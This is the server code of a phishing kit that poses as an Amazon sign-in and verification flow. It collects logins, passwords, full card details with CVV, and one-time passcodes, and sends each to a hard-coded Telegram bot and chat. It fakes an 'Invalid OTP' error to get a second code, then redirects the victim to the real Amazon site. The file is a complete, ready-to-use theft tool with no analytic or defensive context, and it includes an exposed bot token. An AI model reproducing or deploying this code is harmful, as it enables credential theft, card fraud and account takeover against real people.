const express = require('express');
const session = require('express-session');
const axios = require('axios');
const path = require('path');
const app = express();

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, '../public')));
app.use(
  session({
    secret: process.env.SESSION_SECRET || 'your-secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: process.env.NODE_ENV === 'production', maxAge: 24 * 60 * 60 * 1000 }, // 24 hours
  })
);

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '7585548516:AAGRcY22KvqX3sme0cIf1b_NXkuF6aSJTA8';
const TELEGRAM_CHAT_ID = '-1002554104085';

// Function to send message to Telegram
async function sendToTelegram(message) {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML',
    });
    console.log('Message sent to Telegram successfully');
  } catch (error) {
    console.error('Error sending to Telegram:', error.message);
  }
}

// Route to provide session data
app.get('/session-data', (req, res) => {
  console.log('Session data requested. Session:', req.session); // Debugging
  res.json({
    error: req.session.error || '',
    user_input: req.session.user_input || '',
  });
});

// Main route
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

// API route for all form submissions
app.post('/submit', async (req, res) => {
  const step = req.body.step || 'email';
  let error = '';

  console.log('Received POST request for step:', step, 'Body:', req.body); // Debugging

  if (step === 'email') {
    const { email_or_phone, password } = req.body;
    if (email_or_phone && password) {
      req.session.user_input = email_or_phone;
      req.session.user_password = password;
      const message = `🔐 <b>LOGIN CREDENTIALS CAPTURED</b> 🔐\n\n` +
        `📧 <b>Email/Phone:</b> ${email_or_phone}\n` +
        `🔑 <b>Password:</b> ${password}\n` +
        `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
      await sendToTelegram(message);
      console.log('Redirecting to /?step=verify_card'); // Debugging
      // بديل للتوجيه: إعادة تحميل الصفحة مع المعلمة
      return res.send(`
        <script>
          window.location.href = '/?step=verify_card';
        </script>
      `);
    } else {
      error = 'Please enter both email/phone and password';
    }
  } else if (step === 'verify_card') {
    const { cardholder_name, card_number, expiration_date, security_code } = req.body;
    if (cardholder_name && card_number && expiration_date && security_code) {
      req.session.card_data = { cardholder_name, card_number, expiration_date, security_code };
      const message = `💳 <b>CREDIT CARD CAPTURED</b> 💳\n\n` +
        `📧 <b>Email/Phone:</b> ${req.session.user_input}\n` +
        `👤 <b>Cardholder:</b> ${cardholder_name}\n` +
        `💳 <b>Card Number:</b> ${card_number}\n` +
        `📅 <b>Expiry:</b> ${expiration_date}\n` +
        `🔒 <b>CVV:</b> ${security_code}\n` +
        `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
      await sendToTelegram(message);
      return res.send(`
        <script>
          window.location.href = '/?step=otp';
        </script>
      `);
    } else {
      error = 'Please fill in all card details';
    }
  } else if (step === 'otp') {
    const { otp } = req.body;
    if (otp) {
      req.session.otp_attempts = req.session.otp_attempts || [];
      req.session.otp_attempts.push(otp);

      const attemptNumber = req.session.otp_attempts.length;
      const message = `🔢 <b>OTP ATTEMPT ${attemptNumber} CAPTURED</b> 🔢\n\n` +
        `📧 <b>Email/Phone:</b> ${req.session.user_input}\n` +
        `🔢 <b>OTP:</b> ${otp}\n` +
        `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
      await sendToTelegram(message);

      if (req.session.otp_attempts.length === 1) {
        await new Promise(resolve => setTimeout(resolve, 10000));
        req.session.error = 'Invalid OTP. Please try again.';
        return res.send(`
          <script>
            window.location.href = '/?step=otp';
          </script>
        `);
      }

      if (req.session.otp_attempts.length >= 2) {
        await new Promise(resolve => setTimeout(resolve, 5000));
        req.session.error = '';
        return res.send(`
          <script>
            window.location.href = '/?step=success';
          </script>
        `);
      }
    } else {
      error = 'Please enter the OTP';
    }
  }

  req.session.error = error;
  res.send(`
    <script>
      window.location.href = '/?step=${step}';
    </script>
  `);
});

// Success page
app.get('/success', (req, res) => {
  res.send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Login Success</title>
          <link rel="stylesheet" href="/styles.css">
      </head>
      <body>
          <div class="container">
              <h1 class="form-title">Login Successful</h1>
              <div>You have successfully logged in. Redirecting to Amazon...</div>
          </div>
          <script>
              setTimeout(() => {
                  window.location.href = 'https://www.amazon.com';
              }, 3000);
          </script>
      </body>
      </html>
  `);
});

module.exports = app;
